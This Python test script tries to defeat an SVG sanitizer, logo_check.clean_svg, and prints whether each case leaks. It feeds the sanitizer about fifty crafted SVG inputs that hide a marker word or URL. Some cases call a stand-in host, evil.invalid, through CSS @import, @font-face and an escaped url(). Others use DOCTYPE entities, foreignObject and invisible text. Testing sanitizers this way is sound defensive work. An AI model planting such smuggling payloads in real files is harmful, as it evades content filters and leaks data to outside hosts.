"""Try to defeat logo_check.clean_svg. Each case hides the word SECRETWORD (or a URL); prints kept/dropped/None. Fictional."""
import sys, xml.etree.ElementTree as ET
from pathlib import Path
sys.path.insert(0, str(Path(sys.argv[1]) / "system" / "scripts"))
import logo_check
H = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="20" viewBox="0 0 40 20">'
R = '<rect width="40" height="20" fill="#06c"/>'
C = {
 "cdata": H + '<style><![CDATA[ .a{fill:red} /* SECRETWORD */ ]]></style>' + R + '</svg>',
 "entity hex lt": H + '<text x="1" y="9">&#x3c;!-- SECRETWORD --&#x3e;</text>' + R + '</svg>',
 "doctype entity": '<!DOCTYPE svg [<!ENTITY s "SECRETWORD">]>' + H + '<text x="1" y="9">&s;</text></svg>',
 "pi": H + '<?foo SECRETWORD?>' + R + '</svg>',
 "foreignObject": H + '<foreignObject width="9" height="9"><div xmlns="http://www.w3.org/1999/xhtml">SECRETWORD</div></foreignObject>' + R + '</svg>',
 "switch": H + '<switch><text x="1" y="9">SECRETWORD</text></switch>' + R + '</svg>',
 "a href": H + '<a href="https://evil.invalid/SECRETWORD"><text x="1" y="9">ok</text></a>' + R + '</svg>',
 "xlink grad": H + '<linearGradient id="g" xlink:href="https://evil.invalid/SECRETWORD"/>' + R + '</svg>',
 "style import": H + '<style>@import url(https://evil.invalid/a.css); rect{fill:url(https://evil.invalid/SECRETWORD)}</style>' + R + '</svg>',
 "style content": H + '<style>rect::after{content:"SECRETWORD"} text{content:"SECRETWORD"}</style>' + R + '</svg>',
 "style font-family": H + '<style>text{font-family:SECRETWORD}</style>' + R + '</svg>',
 "attr font-family": H + '<text x="1" y="9" font-family="SECRETWORD, serif">ok</text>' + R + '</svg>',
 "font-family quoted words": H + '<text x="1" y="9" font-family="\'Times New Roman\'">ok</text>' + R + '</svg>',
 "set to": H + '<rect width="4" height="4"><set attributeName="fill" to="SECRETWORD"/></rect></svg>',
 "animate": H + '<rect width="4" height="4"><animate attributeName="x" values="SECRETWORD"/></rect></svg>',
 "aria-label": H + '<rect aria-label="SECRETWORD" width="4" height="4"/></svg>',
 "data-x": H + '<rect data-x="SECRETWORD" width="4" height="4"/></svg>',
 "id": H + '<rect id="SECRETWORD" width="4" height="4"/></svg>',
 "class": H + '<rect class="SECRETWORD" width="4" height="4"/></svg>',
 "style attr": H + '<rect style="fill:red;--x:SECRETWORD;font-family:SECRETWORD" width="4" height="4"/></svg>',
 "tspan visible": H + '<text x="1" y="9">A<tspan>SECRETWORD</tspan></text>' + R + '</svg>',
 "tspan hidden tail": H + '<text x="1" y="9">A<tspan display="none">x</tspan>tailSECRETWORD</text>' + R + '</svg>',
 "textPath": H + '<text><textPath href="#p">SECRETWORD</textPath></text>' + R + '</svg>',
 "mask text": H + '<mask id="m"><text x="1" y="9">SECRETWORD</text></mask>' + R + '</svg>',
 "clip text": H + '<clipPath id="m"><text x="1" y="9">SECRETWORD</text></clipPath>' + R + '</svg>',
 "pattern": H + '<pattern id="p"><text x="1" y="9">SECRETWORD</text></pattern>' + R + '</svg>',
 "marker": H + '<marker id="p"><text x="1" y="9">SECRETWORD</text></marker>' + R + '</svg>',
 "symbol+use": H + '<symbol id="s"><text>SECRETWORD</text></symbol><use href="#s"/>' + R + '</svg>',
 "tspan outside text": H + '<g><tspan>SECRETWORD</tspan></g>' + R + '</svg>',
 "text in g text": H + '<text x="1" y="9"><g>SECRETWORD</g></text>' + R + '</svg>',
 "white on white": H + '<rect width="40" height="20" fill="#fff"/><text x="1" y="9" fill="#fff">SECRETWORD</text></svg>',
 "scale 0": H + '<text x="1" y="9" transform="scale(0.00001)">SECRETWORD</text>' + R + '</svg>',
 "clipped": H + '<clipPath id="c"><rect width="0" height="0"/></clipPath><text clip-path="url(#c)" x="1" y="9">SECRETWORD</text>' + R + '</svg>',
 "behind": H + '<text x="1" y="9">SECRETWORD</text>' + R + '</svg>',
 "other ns default": '<svg xmlns="http://www.w3.org/2000/svg"><g xmlns="urn:x"><text>SECRETWORD</text></g>' + R + '</svg>',
 "no ns root": '<svg width="4" height="4"><text x="1" y="3">SECRETWORD</text></svg>',
 "svg ns prefix": '<s:svg xmlns:s="http://www.w3.org/2000/svg" width="4" height="4"><s:text x="1" y="3">SECRETWORD</s:text></s:svg>',
 "xml:space/lang": H + '<text xml:lang="SECRETWORD" x="1" y="9">ok</text></svg>',
 "url fragment word": H + '<rect fill="url(#SECRETWORD)" width="4" height="4"/></svg>',
 "url two": H + '<rect fill="url(#a) url(https://evil.invalid)" width="4" height="4"/></svg>',
 "url escape": H + '<rect style="fill:u\\72l(https://evil.invalid)" width="4" height="4"/></svg>',
 "path words": H + '<path d="M0 0 SECRETWORD"/></svg>',
 "selector attr": H + '<style>rect[title=SECRETWORD]{fill:red} .SECRETWORD{fill:red}</style>' + R + '</svg>',
 "media rule": H + '<style>@media print{rect{fill:red}} @font-face{font-family:x;src:url(https://evil.invalid)}</style>' + R + '</svg>',
 "unclosed": H + '<g><text>SECRETWORD',
 "huge": H + R * 60000 + '</svg>',
 "colour-word message": H + '<rect fill="red" stroke="tan" width="4" height="4"/></svg>',
 "xml decl utf8": '<?xml version="1.0" encoding="UTF-8"?>' + H + R + '</svg>',
 "illustrator doctype": '<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">' + H + R + '</svg>',
 "nbsp entity": H + '<text x="1" y="9">A&nbsp;B</text>' + R + '</svg>',
}
for k, s in C.items():
    out = logo_check.clean_svg(s.encode())
    if out is None:
        print(f"{k:28} -> None (dropped)"); continue
    t = out.decode()
    try: ET.fromstring(t); wf = "wf"
    except ET.ParseError as e: wf = f"NOT-WF {e}"
    leak = [w for w in ("SECRETWORD", "evil.invalid", "<!--", "import", "content") if w in t]
    print(f"{k:28} -> {wf} len={len(t)} leak={leak}" + (f"  :: {t[:220]}" if leak or len(t) < 400 and k in ("white on white","scale 0","clipped","behind","tspan outside text","no ns root","svg ns prefix","font-family quoted words","colour-word message") else ""))
